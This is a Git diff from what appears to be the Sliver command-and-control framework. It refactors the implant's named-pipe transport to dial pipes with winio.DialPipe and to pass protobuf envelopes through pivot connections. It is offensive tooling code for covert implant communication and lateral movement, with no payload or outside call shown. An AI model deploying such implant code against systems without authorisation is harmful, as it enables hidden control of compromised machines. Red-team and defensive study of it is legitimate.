@@ -30,33 +30,26 @@ import (
 	// {{end}}
 
 	pb "github.com/bishopfox/sliver/protobuf/sliver"
+	"github.com/bishopfox/sliver/sliver/3rdparty/winio"
 	"github.com/bishopfox/sliver/sliver/pivots"
-	"github.com/bishopfox/sliver/sliver/pivots/namedpipe"
 )
 
-func namePipeDial(uri *url.URL) (*namedpipe.PipeConn, error) {
+func namePipeDial(uri *url.URL) (net.Conn, error) {
 	address := uri.String()
 	address = strings.ReplaceAll(address, "namedpipe://", "")
 	address = "\\\\" + strings.ReplaceAll(address, "/", "\\")
 	// {{if .Debug}}
 	log.Print("Named pipe address: ", address)
 	// {{end}}
-	return namedpipe.Dial(address)
+	return winio.DialPipe(address, nil)
 }
 
-func namedPipeWriteEnvelope(conn *namedpipe.PipeConn, envelope *pb.Envelope) error {
-	// {{if .Debug}}
-	log.Printf("namedPipeWriteEnvelope %d\n", envelope.GetType())
-	// {{end}}
-	var connection net.Conn
-	connection = conn
-	return pivots.PivotWriteEnvelope(&connection, envelope)
+func namedPipeWriteEnvelope(conn *net.Conn, envelope *pb.Envelope) error {
+	return pivots.PivotWriteEnvelope(conn, envelope)
 }
 
-func namedPipeReadEnvelope(conn *namedpipe.PipeConn) (*pb.Envelope, error) {
-	var connection net.Conn
-	connection = conn
-	return pivots.PivotReadEnvelope(&connection)
+func namedPipeReadEnvelope(conn *net.Conn) (*pb.Envelope, error) {
+	return pivots.PivotReadEnvelope(conn)
 }
 
 // {{end}} -NamePipec2Enabled
